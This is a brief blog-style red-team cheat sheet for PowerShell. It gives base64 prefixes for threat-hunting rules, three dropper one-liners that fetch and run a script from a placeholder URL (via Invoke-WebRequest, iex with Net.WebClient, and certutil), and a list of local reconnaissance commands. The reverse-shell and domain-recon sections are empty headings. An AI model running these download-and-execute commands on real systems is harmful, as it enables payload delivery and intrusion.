---
layout: post
title:  "Powershell for Red Teaming"
date:   2025-06-16 21:00:00 +1000
categories: scripts
---

## Red teaming powershell scripts. Droppers and more.

--- Threat Hunting Patterns ---
Base64 is deterministic. Meaning there is no randomness. So, identifying patterns is important when threat hunting and creating SIEM rules.
- SQBuAHYAbwBrAGUALQBX (Invoke-WebRequest)
- aQBlAHgAIAAoAE4AZQB3 (iex (New-Object Net.WebClient))

### Droppers
--- Unencoded Droppers ---
- ``` powershell -Command "Invoke-WebRequest -Uri 'https://google.com/safe-script.ps1' -OutFile $env:TEMP\Word.ps1; & $env:TEMP\Word.ps1" ``` (Downloads to disk)
- ``` powershell -Command "iex(New-Object Net.WebClient).DownloadString('https://google.com/safe-script.ps1')" ``` (Downloads to memory)
- ``` powershell -Command certutil -urlcache -split -f https://google.com/safe-script.ps1 payload.exe``` (LOLBAS Download)

### Reverse Shell One-Liners
--- TCP Rev Shell ---

### Recon Commands
--- Local Recon ---
- Get-Process
- Get-LocalUser
- Get-NetIPConfiguration
- Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
- whoami /user
- Get-LocalGroupMember -Group "Administrators"
- Get-LocalGroup | ForEach-Object { Get-LocalGroupMember -Group $_.Name }
- Get-SmbShare
- net view \\hostname

--- Domain Recon ---